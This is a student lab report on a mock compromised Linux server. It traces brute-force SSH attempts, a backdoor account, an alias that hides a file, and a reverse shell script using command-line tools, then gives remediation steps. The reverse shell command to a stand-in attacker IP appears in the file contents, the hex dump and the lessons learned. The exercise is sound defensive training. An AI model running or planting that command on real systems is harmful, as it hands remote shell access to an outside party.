# Lab Report: Compromised Server Investigation

**Date:** Month 1, Week 3
**Author:** Justus Irabor
**Environment:** Self-owned mock environment (`~/Desktop/compromise/`)

---

## Scope and Authorization

This was a self-owned, mock environment built in `~/Desktop/compromise/`. No real systems were touched. All data was synthetic. This was an educational exercise, not a client engagement.

---

## Scenario

A mock compromised Linux server was created with:

- A fake `auth.log` containing failed and successful SSH logins
- A suspicious reverse shell in `tmp/backdoor.sh`
- A backdoor user in `etc/passwd`
- A suspicious alias in `home/darkhand/.bashrc` hiding the reverse shell
- Fake log files (`app1.log`, `app2.log`), config files, and a suspicious binary

The goal: investigate the system using only command-line tools (`grep`, `awk`, `sed`, `find`, `xargs`, `file`, `strings`, `xxd`, `sort`, `uniq`, `wc`) and produce an incident summary.

---

## Methodology

| Category | Tools used |
|---|---|
| Log analysis | `grep`, `wc`, `awk`, `sort`, `uniq` |
| File system investigation | `find`, `xargs` |
| File identification | `file`, `strings`, `xxd` |
| Permission analysis | `ls -l`, `chmod`, `find -perm` |
| Shell configuration | `cat`, `alias` inspection |

---

## Findings

### 1. Failed Login Analysis

**Command:**
```bash
grep "Failed" auth.log | wc -l
```

**Result:** 9 failed logins.

**Attacking IPs:**

```bash
awk '/Failed/ {for(i=1;i<=NF;i++) if($i=="from") print $(i+1)}' auth.log | sort | uniq -c | sort -nr
```

| IP | Attempts |
|---|---|
| 203.0.113.5 | 5 |
| 198.51.100.10 | 3 |
| 172.16.0.1 | 1 |

**Targeted usernames:**

```bash
awk '/Failed/ {for(i=1;i<=NF;i++) if($i=="for") print $(i+1)}' auth.log | sort | uniq -c | sort -nr
```

| Username | Attempts |
|---|---|
| admin | 4 |
| root | 2 |
| oracle | 1 |
| postgres | 1 |
| invalid | 1 (from "invalid user test" line) |

**Successful logins:**

```bash
grep "Accepted" auth.log
```

**Result:** 3 successful logins, all for `darkhand` from `192.168.1.50` (a normal internal IP).

---

### 2. Reverse Shell in `tmp/backdoor.sh`

**File identification:**

```bash
file tmp/backdoor.sh
# Bourne-Again shell script, ASCII text executable
```

**Content:**

```bash
cat tmp/backdoor.sh
#!/bin/bash
bash -i >& /dev/tcp/203.0.113.5/4444 0>&1
```

**Hex dump:**

```bash
xxd tmp/backdoor.sh | head -3
00000000: 2321 2f62 696e 2f62 6173 680a 6261 7368  #!/bin/bash.bash
00000010: 202d 6920 3e26 202f 6465 762f 7463 702f   -i >& /dev/tcp/
00000020: 3230 332e 302e 3131 332e 352f 3434 3434  203.0.113.5/4444
00000030: 2030 3e26 310a                            0>&1.
```

**Analysis:** This is a reverse shell. It connects back to `203.0.113.5` on port `4444` and gives that IP an interactive shell on this system.

**Connection:** `203.0.113.5` is the same IP that made the most failed login attempts (5). The attacker brute-forced, then dropped a reverse shell calling back to the same C2 server.

---

### 3. Backdoor User in `etc/passwd`

**Content:**

```bash
cat etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
darkhand:x:1000:1000:darkhand:/home/darkhand:/bin/bash
backdoor:x:1001:1001::/tmp:/bin/bash
```

**Analysis:** The `backdoor` user (UID 1001) has home directory `/tmp` and shell `/bin/bash`. This is a persistence mechanism — the attacker added an account they can use to log back in.

---

### 4. Suspicious Alias in `.bashrc`

**Content:**

```bash
cat home/darkhand/.bashrc
export PATH=/usr/local/bin:/usr/bin:/bin
alias ls='ls --hide=backdoor.sh'
alias ll='ls -la'
```

**Analysis:** The alias `ls --hide=backdoor.sh` hides the reverse shell from `ls` output. When `darkhand` runs `ls`, they don't see the backdoor.

**Bypass methods:**
- `\ls` — disables the alias for one command.
- `/bin/ls` — full path bypasses the alias.

---

### 5. The "Suspicious" File That Wasn't

**File:** `usr/bin/suspicious`

**Identification:**

```bash
file usr/bin/suspicious
# ASCII text
```

**Content:**

```bash
strings usr/bin/suspicious
# ELF fake binary content with hidden strings
```

**Analysis:** Despite its name, this is just a text file. Not an ELF binary. Not executable. Not dangerous.

**Lesson:** Content, not name, determines threat. Always use `file` to verify what a file actually is.

---

## Evidence Summary

| Indicator | Value |
|---|---|
| Attacking IP (most attempts) | `203.0.113.5` (5 failed attempts) |
| Attacking IP | `198.51.100.10` (3 failed attempts) |
| Attacking IP | `172.16.0.1` (1 failed attempt, invalid user) |
| Suspicious file | `tmp/backdoor.sh` — reverse shell |
| C2 server | `203.0.113.5:4444` (same as attacking IP) |
| Suspicious user | `backdoor` (UID 1001) in `etc/passwd` |
| Suspicious alias | `alias ls='ls --hide=backdoor.sh'` |

---

## Attack Chain

1. **Reconnaissance / brute-force:** `203.0.113.5` made 5 failed SSH login attempts.
2. **File drop:** A reverse shell (`backdoor.sh`) was placed in `/tmp/`, calling back to `203.0.113.5:4444`.
3. **Persistence:** A `backdoor` user was added to `/etc/passwd` (UID 1001, home `/tmp`, shell `/bin/bash`).
4. **Evasion:** An alias in `.bashrc` hides `backdoor.sh` from `ls`.

**Note:** The logs do not show a successful login from `203.0.113.5`. It is unclear from the logs alone whether the attacker gained access another way, or dropped the files hoping they would be executed. A real investigation would check `auth.log` for gaps, auditd logs for file creation, and bash history for execution traces.

---

## Remediation Recommendations

| Step | Action |
|---|---|
| 1. Isolate | Disconnect the system from the network to stop the reverse shell callback. |
| 2. Preserve | Take a filesystem snapshot before making changes. |
| 3. Contain | Kill any suspicious processes, disable the `backdoor` user account. |
| 4. Eradicate | Remove `backdoor.sh`, remove the `backdoor` user, remove the alias from `.bashrc`. |
| 5. Recover | Restore from a known-good backup if possible. Verify integrity. |
| 6. Lessons learned | How did the attacker get in? Brute-force? Misconfiguration? Review firewall rules, SSH hardening. |

---

## What This Artifact Proves

- I can combine multiple command-line tools to investigate a compromised system.
- I can correlate data across sources — the same IP (`203.0.113.5`) appeared in both the log and the reverse shell.
- I can identify common persistence techniques: reverse shell, backdoor user, alias evasion.
- I can distinguish a real threat (reverse shell) from a false positive (the file named "suspicious" that was just text).

---

## What This Artifact Does NOT Prove

- I have not tested this against a real system.
- I have not performed actual incident response on live infrastructure.
- The "attacker" behavior was simulated, not observed in the wild.
- I have not validated these techniques against a modern EDR or monitoring system.
- The logs do not confirm the attacker successfully logged in — I inferred the connection, not proven it.

---

## Lessons Learned

1. **Correlate data across sources.** The same IP in the log and in the reverse shell is the story.
2. **Content over name.** A file named "suspicious" was just text. The real threat was `backdoor.sh`.
3. **Understand signatures.** A reverse shell has a recognizable format: `bash -i >& /dev/tcp/IP/PORT 0>&1`.
4. **Careful language.** "The attacker brute-forced his way in" is an assumption. "The IP made 5 failed attempts, and the same IP is in the reverse shell" is an observation.
5. **Incident response order:** Isolate → Preserve → Contain → Eradicate → Recover → Lessons learned.

---

*All work was conducted in an authorized, self-owned lab environment.*